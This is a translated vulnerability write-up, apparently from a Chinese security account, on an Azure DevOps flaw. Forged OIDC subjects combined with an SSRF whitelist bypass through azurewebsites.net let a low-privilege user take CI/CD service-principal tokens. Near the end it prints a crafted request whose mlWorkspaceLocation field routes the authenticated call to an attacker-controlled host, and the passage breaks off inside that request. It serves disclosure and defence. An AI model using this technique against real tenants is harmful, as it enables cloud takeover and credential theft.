#  Azure DevOps权限提升漏洞分析  
Dubito
                    Dubito  云原生安全指北   2026-03-06 00:35  
  
   
  
> 注：本文翻译自 Daze Security 的文章  
《Azure DevOps Privilege Escalation via OIDC Abuse》[1]  
，可点击文末“阅读原文”按钮查看英文原文。  
  
  
全文如下：  
  
2025 年年中，我在 Azure DevOps 中发现了一个漏洞，该漏洞可用于提升权限，并通过 DevOps 服务连接入侵 Azure 环境。在大多数使用 DevOps 进行 CI/CD 并采用工作负载身份作为服务连接凭证的组织中，此漏洞可能被滥用来完全控制其 Azure 环境。  
## 摘要  
- • Azure DevOps 存在一个权限提升漏洞，该漏洞源于其联合凭证（federated credentials）功能的实现缺陷。  
  
- • 一个低权限的 Azure DevOps 用户能够伪造 OIDC 令牌，以代表组织内的任意 CI/CD 流水线。  
  
- • 攻击者可以通过另一个 SSRF 漏洞来窃取令牌。  
  
- • 成功登录的日志显示，该登录行为源自 Azure DevOps 服务的 IP 地址。  
  
## 一、引言  
  
CI/CD 流水线（pipeline）常常被忽视，但它们却是组织中最关键的攻击面之一。在现代云开发和运维实践中，几乎所有操作都由这些流水线执行——它们通过基础设施即代码（infrastructure-as-code，IaC）部署云资源、配置这些资源、构建和部署代码，在某些组织中，甚至通过赋予流水线高权限来管理 Entra ID 本身。这意味着，如果攻击者能够获取分配给 CI/CD 流水线的权限，他们实际上就成为了管理员。  
  
攻击者尝试夺取这些权限的方式有很多种，例如入侵权限过高的开发者、攻陷构建代理（build agents）、在源代码中查找 secrets，或发起 CI/CD 攻击。然而，这些通常是由于网络钓鱼、错误配置和不良操作实践导致的，并非本文要讨论的主题。  
  
本文将重点介绍 Azure DevOps 产品本身存在的一个漏洞，该漏洞可被用来夺取其 CI/CD 流水线的权限。尚不清楚此缺陷存在了多久，但自 DevOps 和 Entra ID 推出联合凭证功能以来，大多数 Azure DevOps 环境很可能都受此漏洞影响。  
  
虽然这个漏洞本身相当简单，但发现它的过程却并非如此。因此，我将引导读者了解将这个漏洞组合成完整利用方法过程中的种种曲折。  
## 二、背景  
  
与大多数漏洞相比，要理解这个问题需要对所涉及的技术有相当深入的了解。具体来说，我们需要了解以下内容：  
- • Entra ID 联合凭证（federated credentials）  
  
- • Azure DevOps 服务连接（Service Connections）和流水线（pipelines）  
  
- • OIDC  
  
- • DevOps 服务连接中 OIDC 的实现  
  
在本节中，我们将对以上每个主题提供一些必要的背景知识。  
### 2.1  Entra ID 联合凭证（Federated Credentials）  
  
Entra ID 中的“服务主体（service principals）”是一种身份类型，常用于在系统间的认证和授权流程中代表一个系统。就像用户一样，可以为服务主体分配权限，以允许该服务主体对其他系统或 API 执行经过身份验证的操作。例如，可以为服务主体分配 Azure RBAC 角色和 Entra ID 角色，或者为其授予 Graph API 权限。  
  
为了“使用”服务主体的权限，或者“登录”为服务主体，一个系统会向 Entra ID 执行   
OAuth 客户端凭证授权（OAuth Client Credential Grant）[2]  
，以登录到特定的后端“资源”，例如 Azure 资源管理 API。此登录请求需要几个参数（详见上面的链接），其中包括该服务主体的客户端 ID（client ID）和某种类型的密钥（secret）。作为响应，Entra ID 会返回一个 OAuth 访问令牌（Access Token），然后可以使用该令牌代表该服务主体与后端资源进行交互。  
  
可以在 Entra ID 服务主体上配置三种类型的密钥来执行这种登录：  
- • 客户端密钥（Client Secret）：一个简单的字符串，用于客户端凭证授权流程。  
  
- • 证书（Certificate）：用于签名一个“断言（assertion）”的证书，然后该断言被用于客户端凭证授权流程。  
  
- • 联合凭证（Federated Credential）：一个由 Issuer（颁发者）/Subject（主题）组成的配对。一个外部的 OIDC 提供方（颁发者）可以签名一个断言，而 Entra ID 将通过该提供方的  
众所周知的公共 URL[3]  
（这是 OIDC 的标准）来验证该断言确实是由该颁发者签名的。这个断言会被用于客户端凭证授权流程。  
  
Entra ID 联合凭证允许用户在 Entra ID 和一个外部 OIDC 提供方之间建立“信任”。这些凭证是更简单的 OAuth 客户端密钥（secrets）和证书的替代方案，它们让用户可以避免执行密钥管理任务，例如向外部系统发送密钥以及轮换这些密钥。在可能的情况下，微软通常认为这是最佳实践。  
### 2.2 Azure DevOps 服务连接和流水线  
  
CI/CD 流水线需要权限才能向其配置或部署的后端资源进行身份验证。例如，在向 Azure 部署基础设施即代码的 CI/CD 流水线中，该流水线需要一种方法，通过向 Azure 订阅或管理组分配的 Azure RBAC 角色来进行身份验证。  
  
如上一节所述，这需要使用 Entra ID 中的服务主体。需要将 CI/CD 环境配置为能够代表一个有权限访问 Azure 的服务主体进行登录。  
  
在 Azure DevOps 中，你可以通过创建所谓的  
“服务连接（Service Connection）”[4]  
来实现这一点。根据你部署的目标系统不同，可以创建多种类型的服务连接。例如，你可以创建专门用于部署到 Azure、访问 Azure Key Vault 或连接到 NuGet 的服务连接。每种服务连接“类型（type）”都有用于身份验证的不同参数。  
  
其中一些连接允许用户指定服务主体的参数进行身份验证，并允许用户选择流水线应使用哪种密钥类型来通过该服务主体向后端资源进行身份验证。在 Azure 中最常用的例子是 Azure 资源管理器（Azure Resource Manager）服务连接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5BSj0Iu7ymrFby57Pwn7UOu4SB4ibCTIHrngNU6CzJFBWKZwEnqHc54W6GUPIMc4zPqaNa8iaR1UhWc52ibMMicm28gricRQt7zQINs/640?from=appmsg "null")  
  
请注意上图中，此服务连接已配置为使用工作负载联合凭证（Workload Federation credential）来登录后端服务主体。下文将对此进行更详细的说明。  
### 2.3 OpenID Connect (OIDC)  
  
OIDC 是一个构建在 OAuth 2.0 之上的协议，它允许应用程序之间进行身份验证，既包括用户，也包括系统。  
  
人们通常只在用户向应用程序进行身份验证的上下文中考虑 OIDC。然而，该协议也可用于服务到服务的身份验证。例如，如今大多数 CI/CD 流水线都提供了某种形式的 OIDC 支持。  
  
简单来说，它的工作原理是这样的：一个后端应用程序需要被配置为“信任（trust）”一个特定的 OAuth/OIDC 授权服务器。这意味着，当该应用程序接收到一个由该 OIDC 颁发者签名的令牌时，它会执行以下简单步骤来检查该令牌是否可信：  
1. 1. 解码令牌（一个 JWT 令牌）。  
  
1. 2. 获取颁发者（issuer）声明。这通常是一个有效的域名，OIDC 的“发现”机制会用到这个域名。  
  
1. 3. 根据发现机制，从该颁发者域名下可用的已知端点（well-known endpoint）获取公开的配置和密钥。  
  
1. 4. 使用从颁发者获取的公钥验证 JWT 令牌的签名。  
  
上述过程简化了一些细节和变体，但对于理解本文来说，这些是需要掌握的重要步骤。  
  
令牌验证通过后，其内容就可以被应用程序信任。令牌的内容包含各种“声明（claims）”，这些声明可用于识别调用者或“客户端”。具体来说，其中有一个标准的 **“主题（subject）”**  
 声明，它唯一地标识了从颁发者获取令牌的用户或系统。  
  
理解验证 OIDC 令牌的流程以及这个主题（subject）声明，对于理解本文所述漏洞的原理至关重要。  
### 2.4 Azure DevOps 服务连接中 OIDC 的实现  
  
OIDC 协议定义了如何通过授权服务器（颁发者issuer）在两个系统之间**建立信任**  
，但除了使用主题（subject）声明之外，它并没有描述如何唯一地标识经过身份验证的系统。在本节中，我们将描述这在 Azure DevOps 内部是如何工作的。  
  
在 Azure DevOps 中，使用工作负载联合向 Entra ID 进行身份验证的流水线会用到 OIDC 协议。这与 Entra ID 联合凭证结合使用，以便在 Entra ID 中的服务主体和 Azure DevOps 中的**特定**  
流水线之间建立信任。此信任关系的配置方法是将颁发者（issuer）设置为 Azure DevOps 授权服务器，并将主题（subject）设置为代表流水线中使用的特定服务连接。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5AmAtqS14jiaIwicDjFoBXdwOuVmDIqsaicxpybOxn4IibNb651bV9bBQicCiaUPR6068lHdjT5rCUEd7RJeM3j1gCLiajB4l8HpImLhs/640?from=appmsg "null")  
  
当 Azure DevOps 流水线运行时，它可以向 DevOps 颁发者为其所使用的服务连接请求一个 OIDC “id 令牌（id token）”。生成的令牌包含该服务连接的唯一主题（subject），如上所述。  
  
在收到服务连接的 id 令牌后，Azure DevOps 流水线运行时会使用该令牌向 Entra ID 服务主体执行客户端凭证授权（client credential grant）（请参见上面关于 Entra ID 联合凭证的部分），并代表该服务主体接收访问令牌。Entra ID 将验证 OIDC 令牌中的主题（subject）是否与服务主体上配置的某个联合凭证相匹配，并且验证该令牌是使用在该联合凭证颁发者（issuer）的发现端点上找到的密钥签名的。  
  
此流程如下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5BsgPEmhpG97Lr2GyRjj32O7OfGx2mtfLhtycKg2NqcicSBBJ10926LQodOib6ZJMHdvicJZ4ok4Jm7upVYRDI5ic75b6DrTeoEJNE/640?from=appmsg "null")  
#### 主题（Subject）声明的重要性  
  
请注意在此设置中主题（subject）的重要性——这是 OIDC 令牌中唯一允许 Entra ID 区分是**哪个**  
服务连接和流水线正在尝试登录的声明。如果主题（subject）声明可以被控制，它就可能被用来冒充任何使用工作负载联合且令牌由同一颁发者签名的服务连接。这个主题（subject）声明正是本文所述漏洞的目标。  
## 三、漏洞分析  
  
基于上文详尽的背景介绍，这个漏洞就比较容易发现了。  
  
Azure DevOps 中存在漏洞的功能，是创建服务连接时一个看起来人畜无害的“验证/保存”按钮：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5DM2ZnBvvegiaY9dBXXgZeia3GhocURMb7BpgKR8ib0IZSMO5IicVxLZcBic76ov3Is1tPkW2eicZZWic61G5cX32bDf7nmicn58PAeJPE/640?from=appmsg "null")  
  
在设置新的服务连接时，Azure DevOps 允许用户“验证”该服务连接是否可用。如果验证成功，则会保存。如果服务连接按照配置“登录”失败，则会向用户显示一条错误信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5BUTJbT3br8pFpfjXdwDvKbv52NDdT6Q1YADeO6Bz5sSsN6NYOPJEb9sgt6CaSoMpHBT1mUaCrVRGyp3icVUpedLCQSMQ8GmNOQ/640?from=appmsg "null")  
  
当选择工作负载联合密钥类型时，此功能同样存在。基于这个按钮的作用，以及它实际上会验证登录是否成功这一事实，我们可以推断出以下几点：  
1. 1. 当点击“验证并保存”时，Azure DevOps 会获取一个带有该服务连接主题（subject）的已签名 OIDC 令牌。  
  
1. 2. Azure DevOps 使用该 OIDC 令牌，针对所配置的服务主体执行一次完整的客户端凭证授权，并获取一个访问令牌。  
  
1. 3. Azure DevOps **使用**  
这个访问令牌去调用某个后端 API，以检查令牌是否有效。  
  
从表面上看，这些步骤似乎没什么危害。然而，当我们查看点击“验证并保存”按钮时实际发送给 DevOps API 的请求内容时，就会发现其中的数据非常可疑：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5C5neRdHATX0SxGdnvEEkcgibGmNTgwPTSInzepmjIf1C8SNoJibVBicLUxtFrmiaIg2ZKHh0XyI8JI4Fgko2JmTTTSbqhIVF18Uk0/640?from=appmsg "null")  
  
为什么说它可疑呢？  
  
**如果用户本不应能够定义 OIDC 令牌中的主题（subject），那为什么浏览器需要在此请求中将 subject 参数发送给 API？API 应该根据服务连接本身就能知道主题（subject）应该是什么！**  
  
请记住，如果我们能控制主题（subject），我们就能控制我们可以**以哪个**  
服务连接的身份登录。  
  
这很可疑，但如果我们无法实际更改 DevOps 用来生成令牌的主题（subject），它就不一定是一个漏洞。设计欠佳的网站和 API 常常包含一些未被实际使用的多余参数。因此，让我们来看看如何进行测试……  
### 验证漏洞  
  
基于上面的截图，我们目前只有一个推测：开发人员搞错了，他们在生成 id 令牌时使用了用户提供的主题（subject），而不是使用映射到服务连接的那个主题。我们需要验证事实是否如此。  
  
如果这个推测是正确的，那么我们就可以利用上面截获的 API 请求，强制 DevOps 生成一个带有任意主题（subject）的 id 令牌。该令牌将在对后端服务主体执行客户端凭证授权以“测试”连接时使用。验证这个推测的一个难点在于，我们实际上无法**看到**  
生成的 id 令牌，因为此 API 的响应要么是错误信息，要么是成功信息。  
  
既然我们看不到 OIDC 令牌，我们可以通过创建一个主题（subject）永远不会被 DevOps 生成的 Entra ID 联合凭证，然后尝试用它登录，来验证我们是否能控制主题（subject）。如果 DevOps 能够验证这个凭证，那么就能证明我们可以控制主题（subject）声明。  
  
这可以通过两个简单的步骤完成：  
1. 1. 创建一个新的服务主体和联合凭证，并设置一个随机的主题（subject）声明，例如：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5BkrwkfSOicOSsWxy98S9Fo2icjz5Zgc0Tfiakky1icK7lnzraAEbcEnlZJJuPG347uAjx3b7tmr4dJRhLhicXTJib4oso7p6NITRauI/640?from=appmsg "null")  
1. 2. 重复点击“验证并保存”时发送的 API 请求，但将请求中的主题（subject）替换为上面设置的主题。  
  
这可以通过 Burp Suite 来完成，先截获请求，修改主题（subject）后再重放该请求。  
  
当我们发送修改后的请求时，会神奇地发现该服务连接通过了针对带有测试主题（subject）声明的后端服务主体的“验证”。可惜我没有当时的响应截图，但请相信，它确实成功了。  
  
现在，回想一下 DevOps 工作负载联合的工作原理，这意味着我们可以控制登录到哪个 Entra ID 服务主体——也就是说，我们可以强制 DevOps 登录到其他服务连接所使用的服务主体，从而可能实现权限提升！  
  
然而，尽管这听起来很令人兴奋，但**到目前为止**  
还没有实际的利用方法——我们无法控制发送到后端 API 的请求，因此无法滥用它，而且我们目前也拿不到令牌……  
## 四、漏洞利用  
  
到目前为止，我们发现的似乎是一个没有实际影响的漏洞。我们知道，在通过这个“服务端点代理（service endpoint proxy）”API测试登录时，我们可以控制由 DevOps 颁发的 OIDC 令牌中的主题（subject）。但是，我们无法提取访问令牌，也无法修改请求。这需要第二个漏洞。  
### 第二个漏洞  
  
事实证明，同一个端点充满了 SSRF 漏洞。在我研究这个端点时，甚至发现其他  
本地研究人员[5]  
也已经在完全相同的端点上发现了几个其他的 SSRF。但这些并不是唯一的 SSRF。  
  
当你点击“验证并保存”时发送给 API 的请求是一个对“服务端点代理”的 POST 请求。除了这个端点本身看起来就像是一个内置的 SSRF 漏洞之外（说真的，谁会认为这是个好主意？），这个请求还有点复杂，包含许多奇怪的细节。ServiceEndpointDetails  
 参数包含相当多有趣的字段，但不清楚如何使用这些字段。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Kric7mM9eA5BBtkKBMU3hv77IaQ8TfTVTlCyOID2dZ4ibs1iarmXDf7uIHsO0KJL3x84MdAuk0w42xjibHFGaeuyC6ztKVXPTv6zWNVEX0w2TNw/640?from=appmsg "null")  
  
请求中最有趣的两个参数实际上是 type  
 和 dataSourceName  
 参数。在上面的截图中，我们看到 type="azurerm"  
（大概是 Azure 资源管理器）和 dataSourceName="TestConnection"  
。也许，如果我们能枚举出所有可用的不同类型和 dataSources  
，就可以访问到一些更隐藏的功能？  
  
在对 Azure DevOps 的 API 文档进行一番探索后，我在 /serviceendpoint/types  
 API 中找到了所有这些信息。这个端点不仅列出了所有可用的服务连接类型，还列出了这些端点的可用配置、可用于验证连接的不同类型的“请求”，以及一些看起来像是在运行时用于将参数注入服务端点请求的模板。这个响应的内容太长了，无法放在这篇博客文章中。仅 azurerm  
 的定义本身就有超过 2000 行格式化的 json。但下面是 azurerm  
 定义的一个极度简化（但仍然很长）的版本，其中包含一些有趣的字段：  
```
{   "inputDescriptors":[      ...      {         "id":"mlWorkspaceName",         "name":"ML Workspace Name",         "description":"Machine Learning Workspace name for connecting to the endpoint.\nRefer to <a href=\"https://docs.microsoft.com/en-us/azure/machine-learning/service/how-to-manage-workspace\" class=\"links-connections bolt-link\" target=_blank>link</a> on how to create a ML workspace.",         "type":null,         "properties":{            "visibleRule":"scopeLevel == AzureMLWorkspace"         },         "inputMode":10,         "isConfidential":false,         "useInDefaultDescription":false,         "groupName":null,         "valueHint":null,         "validation":{            "dataType":10,            "isRequired":true,            "maxLength":255         }      },         ],   "authenticationSchemes":[      {         "inputDescriptors":[            {               "id":"accessToken",               "name":"Access Token",               "description":"Access token to be used for creating the service principal",               "type":null,               "properties":null,               "inputMode":10,               "isConfidential":true,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":10,                  "maxLength":256               },               "values":{                  "inputId":"accessTokenInput",                  "isDisabled":true               }            },            {               "id":"role",               "name":"Role",               "description":"Role to be assigned to the service principal",               "type":null,               "properties":null,               "inputMode":10,               "isConfidential":false,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":10,                  "maxLength":256               },               "values":{                  "inputId":"roleInput",                  "isDisabled":true               }            },            {               "id":"scope",               "name":"Scope",               "description":"Scope on which the role should be assigned to the service principal",               "type":null,               "properties":null,               "inputMode":10,               "isConfidential":false,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":10,                  "maxLength":1024               },               "values":{                  "inputId":"scopeInput",                  "isDisabled":true               }            },            {               "id":"accessTokenFetchingMethod",               "name":"Access Fetching Method",               "description":"How the Access Token is fetched",               "type":null,               "properties":null,               "inputMode":10,               "isConfidential":false,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":10,                  "maxLength":128               },               "values":{                  "inputId":"accessTokenFetchingMethodInput",                  "isDisabled":true               }            },            {               "id":"serviceprincipalid",               "name":"Application (client) ID",               "description":"",               "type":null,               "properties":null,               "inputMode":10,               "isConfidential":false,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":40,                  "isRequired":true               }            },            {               "id":"tenantid",               "name":"Directory (tenant) ID",               "description":"",               "type":null,               "properties":null,               "inputMode":10,               "isConfidential":false,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":40,                  "isRequired":true               }            },            {               "id":"workloadIdentityFederationSubject",               "name":"Workload Identity Federation subject",               "description":"Workload Identity Federation subject that will be used in the subject claim of the client assertion token. \nThis is derived from your organization, project and service connection name, and cannot be set by the user. \nRefer to <a href=\"https://aka.ms/azdo-rm-workload-identity\" class=\"links-connections bolt-link\" target=_blank>Workload Identity Federation in AzureDevOps link</a> on how this is used.",               "type":null,               "properties":null,               "inputMode":0,               "isConfidential":false,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":10               }            },            {               "id":"workloadIdentityFederationIssuer",               "name":"Workload Identity Federation issuer",               "description":"Workload Identity Federation issuer that will be used in the issuer claim of the client assertion token. \nThis is unique to an organization, and cannot be set by the user. \nRefer to <a href=\"https://aka.ms/azdo-rm-workload-identity\" class=\"links-connections bolt-link\" target=_blank>Workload Identity Federation in AzureDevOps link</a> on how this is used.",               "type":null,               "properties":null,               "inputMode":0,               "isConfidential":false,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":10               }            },            {               "id":"workloadIdentityFederationIssuerType",               "name":"Issuer type",               "description":"The type of the Workload Identity Federation issuer that will appear in the issuer claim of the client assertion token.",               "type":null,               "properties":null,               "inputMode":0,               "isConfidential":false,               "useInDefaultDescription":false,               "groupName":"AuthenticationParameter",               "valueHint":null,               "validation":{                  "dataType":10               }            }         ],         "scheme":"WorkloadIdentityFederation",         "displayName":"Workload Identity federation with OpenID Connect",         "requiresOAuth2Configuration":true,         "dataSourceBindings":[                     ],         "authorizationHeaders":[                     ],         "clientCertificates":[                     ],         "properties":{            "isVerifiable":"False",            "canIssueAzureAccessTokens":"True"         }      },         ],   "dataSources":[      {         "name":"TestConnection",         "endpointUrl":"{{{endpoint.url}}}{{#equals endpoint.scopeLevel 'ManagementGroup'}}providers/Microsoft.Management/managementGroups/{{{endpoint.managementGroupId}}}?api-version=2018-01-01-preview{{else}}subscriptions/{{{endpoint.subscriptionId}}}?api-version=2016-06-01{{/equals}}",         "requestVerb":null,         "requestContent":null,         "resourceUrl":"",         "resultSelector":"jsonpath:$",         "callbackContextTemplate":null,         "callbackRequiredTemplate":null,         "initialContextTemplate":null,         "headers":[                     ],         "authenticationScheme":null      },      {         "name":"ServicePrincipalSignInAudience",         "endpointUrl":"{{{endpoint.microsoftGraphUrl}}}/v1.0/servicePrincipals/{{{endpoint.spnObjectId}}}",         "requestVerb":null,         "requestContent":null,         "resourceUrl":"{{{endpoint.microsoftGraphUrl}}}",         "resultSelector":"jsonpath:$.signInAudience",         "callbackContextTemplate":null,         "callbackRequiredTemplate":null,         "initialContextTemplate":null,         "headers":[                     ],         "authenticationScheme":null      },      {         "name":"CreateWebhook",         "endpointUrl":"https://{{endpoint.mlWorkspaceLocation}}.experiments.azureml.net/webhook/v1.0/subscriptions/{{endpoint.subscriptionId}}/resourceGroups/{{endpoint.resourceGroupName}}/providers/Microsoft.MachineLearningServices/workspaces/{{endpoint.mlWorkspaceName}}/webhooks/{{{webHookName}}}_{{{definition}}}",         "requestVerb":"PUT",         "requestContent":"{\"EventType\":\"ModelRegistered\", \"Id\": \"{{{webHookName}}}_{{{definition}}}\", \"CallbackUrl\":\"{{{payloadUrl}}}\", \"Filters\": {\"ModelName\": \"{{{definition}}}\"} }",         "resourceUrl":"",         "resultSelector":"jsonpath:$",         "callbackContextTemplate":null,         "callbackRequiredTemplate":null,         "initialContextTemplate":null,         "headers":[                     ],         "authenticationScheme":null      },      {         "name":"AzureKeyVaultSecretByName",         "endpointUrl":"https://{{{KeyVaultName}}}.{{{endpoint.AzureKeyVaultDnsSuffix}}}/secrets/{{{SecretName}}}?api-version=2016-10-01",         "requestVerb":null,         "requestContent":null,         "resourceUrl":"{{{endpoint.AzureKeyVaultServiceEndpointResourceId}}}",         "resultSelector":"jsonpath:$.value",         "callbackContextTemplate":null,         "callbackRequiredTemplate":null,         "initialContextTemplate":null,         "headers":[                     ],         "authenticationScheme":null      },      {         "name":"AzureStorageContainer",         "endpointUrl":"https://{{storageAccount}}.blob.{{endpoint.StorageEndpointSuffix}}/?comp=list",         "requestVerb":null,         "requestContent":null,         "resourceUrl":"",         "resultSelector":"xpath:EnumerationResults/Containers/Container/Name",         "callbackContextTemplate":null,         "callbackRequiredTemplate":null,         "initialContextTemplate":null,         "headers":[                     ],         "authenticationScheme":{            "type":"ms.vss-endpoint.endpoint-auth-scheme-azure-storage",            "inputs":{               "storageAccountName":"{{ storageAccount }}",               "storageAccessKey":"{{ #GetAzureStorageAccessKey storageAccount }}"            }         }      },      {         "name":"AzureKubernetesClusters",         "endpointUrl":"{{{endpoint.url}}}subscriptions/{{{endpoint.subscriptionId}}}/providers/Microsoft.ContainerService/managedClusters?api-version=2018-03-31{{{#if nextQueryParam}}}&{{{nextQueryParam}}}{{{/if}}}",         "requestVerb":null,         "requestContent":null,         "resourceUrl":"",         "resultSelector":"jsonpath:$.value[*]",         "callbackContextTemplate":"{\"nextQueryParam\": \"{{#getTokenValue response.nextLink}}{{extractUrlQueryParamKeyValue %24skiptoken,skipToken}}{{/getTokenValue}}\"}",         "callbackRequiredTemplate":"{{isTokenPresent response.nextLink}}",         "initialContextTemplate":"{\"nextQueryParam\": \"\"}",         "headers":[                     ],         "authenticationScheme":null      },         ],   "dependencyData":[      {         "map":[            {               "key":"AzureCloud",               "value":[                  {                     "key":"environmentUrl",                     "value":"https://management.azure.com/"                  },                  {                     "key":"galleryUrl",                     "value":"https://gallery.azure.com/"                  },                  {                     "key":"serviceManagementUrl",                     "value":"https://management.core.windows.net/"                  },                  {                     "key":"resourceManagerUrl",                     "value":"https://management.azure.com/"                  },                  {                     "key":"activeDirectoryAuthority",                     "value":"https://login.microsoftonline.com/"                  },                  {                     "key":"environmentAuthorityUrl",                     "value":"https://login.windows.net/"                  },                  {                     "key":"microsoftGraphUrl",                     "value":"https://graph.microsoft.com/"                  },                  {                     "key":"managementPortalUrl",                     "value":"https://manage.windowsazure.com/"                  },                  {                     "key":"armManagementPortalUrl",                     "value":"https://portal.azure.com/"                  },                  {                     "key":"activeDirectoryServiceEndpointResourceId",                     "value":"https://management.core.windows.net/"                  },                  {                     "key":"sqlDatabaseDnsSuffix",                     "value":".database.windows.net"                  },                  {                     "key":"AzureKeyVaultDnsSuffix",                     "value":"vault.azure.net"                  },                  {                     "key":"AzureKeyVaultServiceEndpointResourceId",                     "value":"https://vault.azure.net"                  },                  {                     "key":"StorageEndpointSuffix",                     "value":"core.windows.net"                  },                  {                     "key":"EnableAdfsAuthentication",                     "value":"false"                  },                  {                     "key":"AzureContianerRegistryRepoSuffix",                     "value":".azurecr.io"                  },                  {                     "key":"cloudEnvironmentCode",                     "value":"pub"                  }               ]            },         ],         "input":"environment"      }   ],   "trustedHosts":[      "azurecr.cn",      "azurecr.io",      "azmk8s.io",      "vault.azure.net",      "vault.azure.cn",      "vault.usgovcloudapi.net",      "vault.microsoftazure.de",      "core.cloudapi.de",      "windows-int.net",      "core.windows.net",      "core.chinacloudapi.cn",      "core.usgovcloudapi.net",      "nuget.org",      "modelmanagement.azureml.net",      "experiments.azureml.net",      "aether.ms",      "azurewebsites.net",      "graph.microsoft.com"   ],   "name":"azurerm",   "displayName":"Azure Resource Manager",   "description":"Service connection type for Azure Resource Manager connections",   "endpointUrl":{      "displayName":"Server Url",      "helpText":"",      "value":"https://management.azure.com/",      "isVisible":"true",      "dependsOn":{         "input":"environment",         "map":[            {               "key":"AzureCloud",               "value":"https://management.azure.com/"            }         ]      }   }}
```  
  
上面的 JSON 数据块为每种数据源类型包含一个对象。回到我们截获的请求，我们看到了数据源类型 "TestConnection"，以及它如何“工作”的定义。具体来说，如果我们查看这个参数：  
```
"endpointUrl":"{{{endpoint.url}}}{{#equals endpoint.scopeLevel 'ManagementGroup'}}providers/Microsoft.Management/managementGroups/{{{endpoint.managementGroupId}}}?api-version=2018-01-01-preview{{else}}subscriptions/{{{endpoint.subscriptionId}}}?api-version=2016-06-01{{/equals}}",
```  
  
这些花括号 "{}" 代表后端使用的 mustache 模板。令人惊讶的是，这个 API 的响应直接展示了服务器端使用的实际模板逻辑。同样，这与   
Binary Security[5]  
 的人员在他们先前发现的这个端点的 SSRF 中得出的结论一致，不过这为我们理解请求是如何构建的提供了更多见解。  
  
现在，我们知道该端点需要向后端发送一个经过身份验证的请求，以“验证”令牌是否有效，因此我们可以假设 "endpointUrl" 参数就是用于该验证的端点。更重要的是，我们可以看到，在几乎所有这些数据源中，endpointUrl 实际上是通过 mustache 模板动态生成的。例如，在我上面添加的这个小片段中：  
```
"name":"AzureKubernetesClusters",         "endpointUrl":"{{{endpoint.url}}}subscriptions/{{{endpoint.subscriptionId}}}/providers/Microsoft.ContainerService/managedClusters?api-version=2018-03-31{{{#if nextQueryParam}}}&{{{nextQueryParam}}}{{{/if}}}","name":"AzureStorageContainer",         "endpointUrl":"https://{{storageAccount}}.blob.{{endpoint.StorageEndpointSuffix}}/?comp=list","name":"AzureKeyVaultSecretByName",         "endpointUrl":"https://{{{KeyVaultName}}}.{{{endpoint.AzureKeyVaultDnsSuffix}}}/secrets/{{{SecretName}}}?api-version=2016-10-01","name":"CreateWebhook",         "endpointUrl":"https://{{endpoint.mlWorkspaceLocation}}.experiments.azureml.net/webhook/v1.0/subscriptions/{{endpoint.subscriptionId}}/resourceGroups/{{endpoint.resourceGroupName}}/providers/Microsoft.MachineLearningServices/workspaces/{{endpoint.mlWorkspaceName}}/webhooks/{{{webHookName}}}_{{{definition}}}","name":"ServicePrincipalSignInAudience",         "endpointUrl":"{{{endpoint.microsoftGraphUrl}}}/v1.0/servicePrincipals/{{{endpoint.spnObjectId}}}",
```  
  
每个数据源都为 mustache 模板使用了不同的参数。在摆弄了这个 API 几分钟后，很明显，终端用户几乎可以控制请求中的所有这些参数。那么换句话说……所有这些参数都容易受到 SSRF 攻击吗？这是否意味着，如果我插入一个我控制的 URL，令牌就会被发送到我的服务器？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5COKAhpQdqg9aVFzicryocLyhlCA1F4EBjOhXZ1bHuxFRQcBMBwOzPaQ6LY7ZarDKrxPtgfKIjUQZWicXQ0H1dUFlnpQGnPYW6Tc/640?from=appmsg "null")  
  
在直接测试后，发现对于**某些**  
参数，可以插入的 URL 存在一个白名单。我没有在 azurerm 类型中找到任何不使用验证的端点。尽管在其他“类型”中有很多容易受到 SSRF 攻击的端点，但我的目标是通过工作负载联合窃取用于 Azure 资源管理器的令牌，因为其影响非常明显。那么，我们如何绕过这个白名单呢？  
  
事实证明——非常容易。如果我们回头看 azurerm  
 类型的定义，其中包含一个“受信主机（trusted hosts）”列表。真是方便！这个列表中包含了 azurewebsites.net  
，这是所有 Azure 应用服务（App Services）创建时使用的域名。因此，要绕过白名单，我们只需创建一个应用服务并使用该域名即可。  
  
在创建一个名为 "bbounty" 的应用服务并将参数设置为 bbounty.azurewebsites.net  
 后——**成了**  
，白名单被绕过，我们的后端应用服务收到了一个请求（只需在日志中打印出请求内容）。以下 JSON 对象被发送到了该端点（请参阅 mlWorkspaceLocation  
 参数）：  
```
{  "dataSourceDetails": {    "dataSourceName": "Models",    "dataSourceUrl": "",    "headers": [],    "resourceUrl": "",    "requestContent": "",    "requestVerb": "",    "parameters": {    },    "resultSelector": "",    "initialContextTemplate": ""  },  "resultTransformationDetails": {    "callbackContextTemplate": "",    "callbackRequiredTemplate": "",    "resultTemplate": ""  },  "serviceEndpointDetails": {    "data": {      "environment": "AzureCloud",      "scopeLevel": "Subscription",      "storageAccount": "test",      "identityType" : "AppRegistrationManual",      "creationMode": "Manual",      "mlWorkspaceLocation": "bbounty.azurewebsites.net?a=",      "subscriptionId": "00000000-0000-0000-0000-000000000000",      "mlWorkspaceName": "test"    },    "type": "azurerm",    "url": "https://management.azure.com/",    "authorization": {      "parameters": {        "tenantid": "be68d3d0-141b-4b3d-b18d-4ddbe8818cf2",        